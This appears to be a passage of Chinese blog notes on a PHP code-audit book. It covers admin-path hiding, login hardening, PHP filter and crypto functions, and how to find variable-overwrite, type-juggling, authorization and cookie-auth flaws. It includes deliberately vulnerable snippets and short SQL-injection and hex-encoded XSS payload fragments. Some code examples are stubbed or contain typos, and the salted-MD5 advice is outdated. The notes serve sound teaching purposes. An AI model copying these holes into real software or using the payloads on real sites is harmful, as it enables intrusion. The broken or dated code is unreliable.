后台地址隐藏</h3><p>渗透测试中几乎每次都要做的事情就是对网站目录进行枚举，看看有没有敏感文件和后台地址泄露。</p><p>一旦发现后台地址，就会对后台进行暴力破解等操作，甚至会利用社会工程学的方式想方设法拿到管理员的密码，相对而言，如果我们连后台地址都不让攻击者找到，那这些攻击手段就用不上，所以，后台目录不能固定，应该由用户登录后台页面后自定义设置，或者直接修改后台文件夹即可，为了提高安全性，还应该在安装完成后立刻提醒管理员修改后台地址</p><h3 id="12-4-密码加密存储方式"><a href="#12-4-密码加密存储方式" class="headerlink" title="12.4 密码加密存储方式"></a>12.4 密码加密存储方式</h3><p>用户自己不会设置高强度的密码</p><p>那服务方应该想办法解决这个问题，一是采用高强度安全环境保存，数据仍然是普通MD5等算法保存，不过谁也无法保证100%安全，这种做法看起来有鸡肋的感觉，另外一种做法就是为密码加一个极其复杂的固定字符串，再进行MD5或者shal算法进行保存，这样通过枚举的方式就很难解密</p><h3 id="12-5-登录限制"><a href="#12-5-登录限制" class="headerlink" title="12.5 登录限制"></a>12.5 登录限制</h3><p>基于纵深防御的思想，假设前面所说的后台地址已经泄露，假设密码被社会工程学等方式窃取到，这种情况下我们就要考虑在登录这一层设置障碍，即使攻击者拿到密码也无法登录。用代码来简单实现最简单的策略如下所示</p><ol><li><p>限制登录IP</p><p>只能固定IP访问，或者说公司内网访问，在外网需要访问的时候拨VPN即可</p></li><li><p>双因素认证</p><p>限制内网IP是相对安全的，但是还不够安全，因为攻击者有很大的可能已经通过其他途径进入到内网，所以就需要用到双因素认证手段，比如手机验证码、动态令牌都是非常有效的方式，我们在渗透测试的时候经常遇到这种情况:拿到密码之后要双因素认证才能登录</p></li></ol><h3 id="12-6-API站库分离"><a href="#12-6-API站库分离" class="headerlink" title="12.6 API站库分离"></a>12.6 API站库分离</h3><p>具体分离参照下图</p><p><img src="https://pic.imgdb.cn/item/60f4268e5132923bf83130e0.png" alt="API站库分离"></p><p>通过API实现站库分离的好处在于：</p><p>攻击者即使拿到了Web服务器，也无法在短时间内将全部数据拖走，只要我们建立API接口监控，设置一个阈值，遇到监控接口突然被频繁调用的情况，则说明可能存在刷库行为，这也起到一种入侵检测的作用</p><h3 id="12-7-慎用第三方服务"><a href="#12-7-慎用第三方服务" class="headerlink" title="12.7 慎用第三方服务"></a>12.7 慎用第三方服务</h3><p>第三方服务的分类有很多，这里说的第三方服务指的是第三方开放给Web应用的接口，或者JS等</p><p>使用第三方通常需要添加一段JS代码，JS可以做的事情很多，挂马、钓鱼、盗取cookie，甚至制造蠕虫病毒和发起 DDOS攻击，一旦攻击者入侵这些第三方服务之后，就可以间接入侵使用了这些服务的网站，危害非常大。如果一定要使用，建议选择权威一点的服务提供商</p><h3 id="12-8-严格的权限控制"><a href="#12-8-严格的权限控制" class="headerlink" title="12.8 严格的权限控制"></a>12.8 严格的权限控制</h3><p>用户权限控制涉及一个角色功能的问题</p><p>细化权限也是安全体系中非常重要的一环，往往职位不高的人安全意识会比较薄弱，密码可能会设置得相对简单，给他较低的权限，就可以限制他的操作行为，从而提高安全性</p><h3 id="12-9-敏感操作多因素验证"><a href="#12-9-敏感操作多因素验证" class="headerlink" title="12.9 敏感操作多因素验证"></a>12.9 敏感操作多因素验证</h3><p>多因素验证在很多操作中都适用，特别是敏感的操作，从业务逻辑上来说，不仅仅是后台的登录、修改配置等操作才算敏感，同样前台用户进行个人操作的时候也一样</p><p>多因素认证从字面意思就可以理解，即添加多种验证方式，敏感操作多次验证权限，验证的方式有如下几种：</p><ol><li>手机短信验证码</li><li>手机语言验证码</li><li>手机App动态令牌</li><li>邮箱验证码</li><li>实体令牌卡</li><li>电子图片令牌卡</li><li>硬件令牌</li></ol><h3 id="12-10-应用自身的安全中心"><a href="#12-10-应用自身的安全中心" class="headerlink" title="12.10 应用自身的安全中心"></a>12.10 应用自身的安全中心</h3><p>虽然现在基于主机WAF、云WAF很多，但是毕竟这些防御方案都不是定制化的，因为无法结合应用代码逻辑，所以无法很好地防御攻击和满足需求，而应用代码层的防御则可以大大利用白名单的优势，比如已经知道某个参数一定是INT类型，就可以在使用这个参数时将其转为INT类型，或者判断是否为数字,.如果不是则将请求驳回，这些优势是其他层面的WAF无法取代的，因此应用自身的安全防御功能必不可少</p><p>一个网站的应用安全防御应该包括对输入的特殊字符过滤、输出过滤、异常访问检测、自身安全检测，等等</p><p>其中，自身安全检测方式有:木马查杀、弱后台地址检测、弱口令检测，等等</p>]]></content>
    
    
    <categories>
      
      <category>书籍 代码审计：企业级Web代码安全架构</category>
      
    </categories>
    
    
    <tags>
      
      <tag>书籍</tag>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>代码审计-PHP安全编程规范-1</title>
    <link href="/2021/07/14/%E4%B9%A6%E7%B1%8D/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9A%E4%BC%81%E4%B8%9A%E7%BA%A7Web%E4%BB%A3%E7%A0%81%E5%AE%89%E5%85%A8%E6%9E%B6%E6%9E%84/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E5%AE%89%E5%85%A8%E7%BC%96%E7%A8%8B%E8%A7%84%E8%8C%83-1/"/>
    <url>/2021/07/14/%E4%B9%A6%E7%B1%8D/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9A%E4%BC%81%E4%B8%9A%E7%BA%A7Web%E4%BB%A3%E7%A0%81%E5%AE%89%E5%85%A8%E6%9E%B6%E6%9E%84/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E5%AE%89%E5%85%A8%E7%BC%96%E7%A8%8B%E8%A7%84%E8%8C%83-1/</url>
    
    <content type="html"><![CDATA[<h1 id="PHP安全编程规范"><a href="#PHP安全编程规范" class="headerlink" title="PHP安全编程规范"></a>PHP安全编程规范</h1><h2 id="第九章-参数的安全过滤"><a href="#第九章-参数的安全过滤" class="headerlink" title="第九章 参数的安全过滤"></a>第九章 参数的安全过滤</h2><p>所有的Web应用攻击都需要传入有害参数，因此对传入的参数进行有效的过滤，就能防御大部分的SQL注入和不少的XSS漏洞</p><h3 id="9-1-第三方过滤函数与类"><a href="#9-1-第三方过滤函数与类" class="headerlink" title="9.1 第三方过滤函数与类"></a>9.1 第三方过滤函数与类</h3><p>在一些中小型Web应用程序中，大多都会选择一些第三方过滤函数或者类。</p><p>这里本书作者分析了discuz的SQL、XSS过滤。</p><h3 id="9-2-内置过滤函数"><a href="#9-2-内置过滤函数" class="headerlink" title="9.2 内置过滤函数"></a>9.2 内置过滤函数</h3><p>PHP本身内置了很多参数过滤的函数。下面简单介绍</p><ol><li><p>SQL注入过滤函数</p><p>相关的过滤函数有addslashes(),mysql_real_escape_string()以及mysql_escape_string()，具体作用都是给字符串添加<code>\</code>来转义<code>&#39;</code>,<code>&quot;</code>,<code>\</code>以及空字符NULL，其中mysql_real_escape_string()会考虑数据库的字符集编码，安全性更佳</p></li><li><p>XSS过滤函数</p><p>相关的过滤函数有htmlspecialchars()和strip_tags()</p><ol><li>htmlspecialchars()的作用是将字符串中的特殊字符转换成HTML实体编码，如<code>&amp;</code>转换成&amp;amp，<code>&quot;</code>转换成&amp;quot；等等，能够防御大多数的XSS攻击</li><li>strip_tags()函数是去掉PHP及HTML的标记，如传入”&lt;h1&gt;xxxxx&lt;/h1&gt;”最后返回的数据是xxxxx</li></ol></li><li><p>命令执行过滤函数</p><p>相关的过滤函数有escapeshellcmd()和escapeshellarg()</p><ol><li><p>escapeshellcmd()</p><p>过滤的字符为<code>&amp;</code>,<code>;</code>,<code>(`)</code>,<code>|</code>,<code>*</code>,<code>?</code>,<code>~</code>,<code>&lt;&gt;</code>,<code>^</code>,<code>()</code>,<code>[]</code>,<code>&#123;&#125;</code>,<code>$</code>,<code>\</code>,<code>\x0A</code>,<code>\xFF</code>,<code>%</code>而<code>&#39;</code>,<code>&quot;</code>仅在不对称的时候被转义，过滤方法是在Windows情况下在对应字符前添加<code>^</code>，而在linux下是在字符前添加<code>\</code></p></li><li><p>escapeshellarg()</p><p>过滤方式比较简单，给所有参数加上一对双引号，强制为字符串</p></li></ol></li></ol><h2 id="第十章-使用安全的加密算法"><a href="#第十章-使用安全的加密算法" class="headerlink" title="第十章 使用安全的加密算法"></a>第十章 使用安全的加密算法</h2><h3 id="10-1-对称加密"><a href="#10-1-对称加密" class="headerlink" title="10.1 对称加密"></a>10.1 对称加密</h3><p>对称加密是采用单密钥进行加密，指该密钥能对数据进行加密和解密处理。安全性取决于对密钥的管理</p><p>PHP中的对称加密算法</p><ol><li><p>3DES加密</p><p>需要在php.ini中打开php_mcrypt.dll以及php_mcrypt_filter.dll两个lib库的引用，去掉以下代码前的分号即可</p><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">;<span class="hljs-attribute">extension</span>=php_mcrypt.dll<br>;<span class="hljs-attribute">extension</span>=php_mcrypt_filter.dll<br></code></pre></div></td></tr></table></figure><p>简单的3DES加密类</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Crypt3Des</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>=<span class="hljs-string">&quot;&quot;</span>;<span class="hljs-comment">// 加密密钥</span><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Crypt3Des</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;key=<span class="hljs-variable">$key</span>;<br>    &#125;<br>    <span class="hljs-comment">// 加密函数</span><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encrypt</span>(<span class="hljs-params"><span class="hljs-variable">$input</span></span>)</span>&#123;<br>        <span class="hljs-variable">$size</span>=mcrypt_get_block_size();<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure></li><li><p>AES加密</p><p>同样需要打开对php_mcrypt.dll库的引用。</p><p>加解密实例：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">   <br></code></pre></div></td></tr></table></figure></li></ol><h3 id="10-2-非对称加密"><a href="#10-2-非对称加密" class="headerlink" title="10.2 非对称加密"></a>10.2 非对称加密</h3><p>非对称加密与对称加密不一样的地方在于，非对称加密有两个密钥，分别为公钥和私钥。</p><p>公钥用于加密，私钥用于解密，且对应公钥加密的内容只能通过私钥进行解密</p><p><strong>RSA加密</strong></p><p>PHP上可用使用phpseclib来使用，<a href="http://phpseclib.sourceforge.net/">下载地址</a></p><p>下载后可直接使用，参考代码：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;./Crypt/RSA.php&quot;</span>);<br><span class="hljs-variable">$rsa</span>=<span class="hljs-keyword">new</span> Crypt_RSA();<br>extract(<span class="hljs-variable">$rsa</span>-&gt;createKry());<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$privatekey</span>&lt;br /&gt;<span class="hljs-subst">$publicKey</span>&quot;</span>;<br><br></code></pre></div></td></tr></table></figure><h3 id="10-3-单向加密"><a href="#10-3-单向加密" class="headerlink" title="10.3 单向加密"></a>10.3 单向加密</h3><p>单向加密，指进行加密后无法解密的算法，即不可逆算法，常用的有MD系列和sha1等</p><p><strong>MD5/sha1</strong></p><p>php提供以上两种算法</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;hello md5:&#x27;</span>.md5(<span class="hljs-string">&quot;hello&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br /&gt;hello sha1:&#x27;</span>.sha1(<span class="hljs-string">&quot;hello&quot;</span>);<br></code></pre></div></td></tr></table></figure><p>结果：</p><blockquote><p>hello md5:5d41402abc4b2a76b9719d911017c592<br>hello sha1:aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>书籍 代码审计：企业级Web代码安全架构</category>
      
    </categories>
    
    
    <tags>
      
      <tag>书籍</tag>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>代码审计-漏洞发现与防范-2</title>
    <link href="/2021/07/14/%E4%B9%A6%E7%B1%8D/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9A%E4%BC%81%E4%B8%9A%E7%BA%A7Web%E4%BB%A3%E7%A0%81%E5%AE%89%E5%85%A8%E6%9E%B6%E6%9E%84/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E4%B8%8E%E9%98%B2%E8%8C%83-2/"/>
    <url>/2021/07/14/%E4%B9%A6%E7%B1%8D/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9A%E4%BC%81%E4%B8%9A%E7%BA%A7Web%E4%BB%A3%E7%A0%81%E5%AE%89%E5%85%A8%E6%9E%B6%E6%9E%84/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E4%B8%8E%E9%98%B2%E8%8C%83-2/</url>
    
    <content type="html"><![CDATA[<h1 id="漏洞发现与防范"><a href="#漏洞发现与防范" class="headerlink" title="漏洞发现与防范"></a>漏洞发现与防范</h1><h2 id="第六章-漏洞挖掘与防范-深入篇"><a href="#第六章-漏洞挖掘与防范-深入篇" class="headerlink" title="第六章 漏洞挖掘与防范(深入篇)"></a>第六章 漏洞挖掘与防范(深入篇)</h2><h3 id="6-1-变量覆盖漏洞"><a href="#6-1-变量覆盖漏洞" class="headerlink" title="6.1 变量覆盖漏洞"></a>6.1 变量覆盖漏洞</h3><p>变量覆盖指的是用我们自定义的参数值替换程序原有的变量。通常配合程序的其他功能来实现完整的功能。如：在文件上传处，若可以将任意扩展名覆盖原来的白名单列表，就可以上传php的shell</p><p>常见的函数有extract(),parse_str(),import_request_variables()。</p><p>其中import_request_variables()是在没有开启全局变量注册时，调用该函数相当于开启了全局变量注册，在&gt;PHP5.4之后函数被取消。</p><p>此外$$方式注册变量没有验证导致覆盖也时有发生。</p><h4 id="6-1-1-挖掘经验"><a href="#6-1-1-挖掘经验" class="headerlink" title="6.1.1 挖掘经验"></a>6.1.1 挖掘经验</h4><p>由于该漏洞经常要结合应用的其他功能进行攻击，所以挖掘时不仅仅要考虑能否实现变量覆盖，还要考虑后面的代码能不能让代漏洞利用起来。</p><p>由函数导致的变量覆盖较为好挖掘，只需要寻找带有变量的相关函数，之后回溯查看变量是否可控extract还需要考虑它的第二个参数。import_request_variables()函数相当于开启全局变量的注册与替换，不过只在PHP4~4.1和5~5.4可用</p><p>而$$导致的变量覆盖，一样可以通过搜索$$进行挖掘，不过建议挖掘之前最好将核心文件通读。</p><ol><li><p>函数使用不当</p><ol><li><p>extract函数</p><p>extract()函数覆盖变量需要一定的条件，函数结构如下</p><p>int extract(array &amp;$var_array [,int $extract_type=EXTR_OVERWRITE [, string &amp;prefix=NULL]])</p><p>相关参数作用如下</p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>var_array</td><td>必需。规定要使用的输出</td></tr><tr><td>extract_type</td><td>可选。extract()函数将检查每个键名是否为合法的变量名，同时也检查符号表中的变量名是否冲突。</td></tr><tr><td>prefix</td><td>可选，仅在extract_type的值是EXTR_PREFIX_SAME,EXTR_PREFIX_ALL,EXTR_PREFIX_INVALID,EXTR_PREFIX_EXISTS时需要，如果附加了前缀后的结果不是合法的变量名，将不会导入符号表中。前缀和数组键名之间会自动加上一个下划线</td></tr></tbody></table><p>测试代码</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$b</span>=<span class="hljs-number">1</span>;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;b&#x27;</span>=&gt;<span class="hljs-string">&#x27;2&#x27;</span>);<br>extract(<span class="hljs-variable">$a</span>);<br>print_r(<span class="hljs-variable">$b</span>);<br><span class="hljs-comment"># 2</span><br></code></pre></div></td></tr></table></figure><p>经过处理后输出为2</p></li><li><p>parse_str函数</p><p>函数作用是解析字符串并注册成变量，会直接覆盖已有的变量</p><p>函数说明如下：</p><p>void parse_str(string $str [, array &amp;$arr])</p><p>测试代码：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$b</span>=<span class="hljs-number">1</span>;<br>parse_str(<span class="hljs-string">&#x27;b=2&#x27;</span>);<br>print_r(<span class="hljs-variable">$b</span>);<br><span class="hljs-comment"># 2</span><br></code></pre></div></td></tr></table></figure><p>原变量的值被覆盖。</p></li><li><p>import_request_variables函数</p><p>函数作用是将GET,POST,COOKIE的参数注册成变量，用在register_globals被禁止时，需要PHP4.1~5.4</p><p>函数说明如下：</p><p>bool import_request_variables(string $types [, string $prefix])</p><p>其中$types代表要注册的变量，分别用对应（GET,POST,COOKIE）的首字母表示。$prefix为要注册变量的前缀</p><p>测试代码：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$b</span>=<span class="hljs-number">1</span>;<br>import_request_variables(<span class="hljs-string">&quot;GP&quot;</span>);<br><span class="hljs-keyword">print</span>(<span class="hljs-variable">$b</span>);<br></code></pre></div></td></tr></table></figure><p>测试结果如图：</p><p><img src="https://pic.imgdb.cn/item/60ee4e665132923bf8339492.png"></p></li><li><p>$$变量覆盖</p><p>一段经典的$$注册变量覆盖代码</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">foreach</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;_COOKIE&#x27;</span>,<span class="hljs-string">&#x27;_POST&#x27;</span>,<span class="hljs-string">&#x27;_GET&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$_request</span>)&#123;<br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$$_request</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$_key</span> =&gt; <span class="hljs-variable">$_value</span>)&#123;<br>        <span class="hljs-variable">$$_key</span>=addslashes(<span class="hljs-variable">$_value</span>);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>代码理解是$_key是传入参数的名称，如?a=1则$_key是a此时核心代码就是$a=addslashes($_value)若之前有参数$a则被覆盖为1</p></li></ol></li></ol><h4 id="6-1-2-漏洞防范"><a href="#6-1-2-漏洞防范" class="headerlink" title="6.1.2 漏洞防范"></a>6.1.2 漏洞防范</h4><p>主要有以下方法进行防范:</p><ol><li><p>使用原始变量</p></li><li><p>验证变量存在</p><p>可以在注册变量之前先判断变量是否存在。如使用extract()函数配置第二个参数为EXTR_SKIP,或parse_str()使用前先进行代码的判断</p></li></ol><h3 id="6-2-逻辑处理漏洞"><a href="#6-2-逻辑处理漏洞" class="headerlink" title="6.2 逻辑处理漏洞"></a>6.2 逻辑处理漏洞</h3><p>这里的逻辑漏洞是指程序在业务逻辑上面的漏洞，常见的漏洞在支付,找回密码,程序安装等</p><h4 id="6-2-1-挖掘经验"><a href="#6-2-1-挖掘经验" class="headerlink" title="6.2.1 挖掘经验"></a>6.2.1 挖掘经验</h4><p>通常该类漏洞的挖掘技巧是通读功能点源码，熟悉业务流程后才可能挖掘的比较顺畅，值得关注点有程序是否可重复安装，修改密码越权，找回密码验证能否暴力破解，cookie能否被预测和绕过等</p><ol><li><p>等于与存在判断绕过</p><p>常见有漏洞的判断函数</p><ol><li><p>in_array函数</p><p>函数用来判断值是否在某个数组列表中，通常方式是</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">in_array(<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>));<br></code></pre></div></td></tr></table></figure><p>如上是没问题的，再看下面的代码</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(in_array(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;typeid&#x27;</span>],<span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>)))&#123;<br>    <span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;select **** where typeid=&#x27;&quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;typeid&#x27;</span>].<span class="hljs-string">&quot;&#x27;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$sql</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>代码很好理解，是判断参数值是否是1,2,3,4中的一个，是就进行下一步拼接。但是in_array函数比较时会进行类型转换，所以我们请求?typeid=1’ union selec…</p><p>输出为：select **** where typeid=1’ union select …</p><p>直接被绕过了，但是判断变成字符形式就不能轻易绕过了</p></li><li><p>is_numeric函数</p><p>函数判断变量是否是数字</p><p>代码</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(is_numeric(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>]))&#123;<br>    <span class="hljs-comment"># 拼接到sql</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>];<br>&#125;<br></code></pre></div></td></tr></table></figure><p>简写了拼接过程，但是逻辑清楚，如果是数字就能进行下一步。但是该函数存在问题，当传入参数是hex时会直接通过返回true，而mysql可以直接使用hex编码代替字符串明文的。此时就可能存在二次注入和XSS等漏洞了</p><p>比如写入&lt;script&gt;alert(1)&lt;/script&gt;的hex编码”0x3C7363726970743E616C6572742831293C2F7363726970743E”</p><p>就会存储在数据库中，可能形成xss漏洞</p></li><li><p>双等于和三等于</p><p>双等于在判断前会做变量类型转换，所以在双等于判断时可能穿在安全隐患</p><p>测试代码:</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">var_dump(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>]==<span class="hljs-number">2</span>);<br></code></pre></div></td></tr></table></figure><p>请求?var=2ssss时同样输出true</p><p>而三等于则不会有该漏洞</p></li></ol></li><li><p>越权漏洞</p><p>越权漏洞分为水平越权和垂直越权，水平越权指相同等级权限的用户，可以获取相同权限的其他用户的信息。垂直越权实在权限等级不同的用户，也能查看获取不属于直接等级的信息。</p><p>该类漏洞基本是账户体系上在判断权限时不严格导致穿在绕过漏洞，经常发生在cookie验证不严，简单判断用户的提交。最基础的例子是，访问个人信息时url为?uid=1此时访问?uid=2可能就能够访问id为2的用户信息</p></li><li><p>未exit或return引发的安全问题</p><p>在如下代码中:</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(file_exists(<span class="hljs-string">&#x27;install.lock&#x27;</span>))&#123;<br>    header(<span class="hljs-string">&quot;Location: ../&quot;</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>仅仅是使用了header()函数进行跳转但是php程序并没有退出，使用如下代码进行测试</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>]==<span class="hljs-number">1</span>)&#123;<br>    header(<span class="hljs-string">&quot;Location: https://www.baidu.com/&quot;</span>);<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>];<br></code></pre></div></td></tr></table></figure><p>使用bp抓包数据</p><p><img src="https://pic.imgdb.cn/item/60ee59985132923bf87e1a0e.png"></p><p>可以看到输出了1说明程序依然在执行，所以正确的做法应当是增加die()或exit()结束</p></li><li><p>常见支付漏洞</p><p>首先是提交时能够直接修改购买的信息，且服务端未进行严格的校验</p><p>其次是以重复发包来利用时间差，以少量的钱多次购买，原理如图：</p><p><img src="https://pic.imgdb.cn/item/60ee5a9a5132923bf8847ae2.png"></p></li></ol><h4 id="6-2-2-漏洞防范"><a href="#6-2-2-漏洞防范" class="headerlink" title="6.2.2 漏洞防范"></a>6.2.2 漏洞防范</h4><p>需要注意的有：</p><ol><li>了解业务逻辑</li><li>熟悉函数的功能和差异</li></ol><h3 id="6-3-会话认证漏洞"><a href="#6-3-会话认证漏洞" class="headerlink" title="6.3 会话认证漏洞"></a>6.3 会话认证漏洞</h3><p>会话认证问题较多出现在cookie上，cookie是Web服务器返回给客户端的一段常用来标识用户身份或者认证情况的字符串，保存在客户端，浏览器请求会自动带上该标识，由于该标识可以被客户端修改所以存在安全风险。</p><h4 id="6-3-1-挖掘经验"><a href="#6-3-1-挖掘经验" class="headerlink" title="6.3.1 挖掘经验"></a>6.3.1 挖掘经验</h4><p>认证漏洞较多出现在cookie验证上，通常是没有使用session来认证，而是直接将用户信息保存在cookie中。程序使用时直接调用，该过程一般都由一个统一的函数去取数据调用，容易导致SQL注入和越权等漏洞。</p><p>在挖掘相关漏洞时，可以先查看程序登录功能的代码，关注登录的业务逻辑，和有没有可控的session值或绕过密码验证的漏洞。另外需要有验证cookie的代码。</p><ol><li><p>cookie认证安全</p><p>cookie一般保存登录账户的标识信息，出现问题较多的是cookie的SQL注入等常见漏洞，以及伪造用户的id。</p><p>一般cookie验证的代码大致如下</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">session_start();<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(账户密码正确)&#123;<br>        setcookie(<span class="hljs-string">&#x27;username&#x27;</span>,<span class="hljs-string">&#x27;admin&#x27;</span>);<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>]=<span class="hljs-string">&#x27;admin&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 判断cookie里面的用户名是否和session里的用户名一致</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_COOKIW</span>[<span class="hljs-string">&#x27;username&#x27;</span>]===<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>])&#123;<br>    <span class="hljs-comment">// 操作$_SESSION[&#x27;username&#x27;]用户的数据</span><br>&#125;<br><span 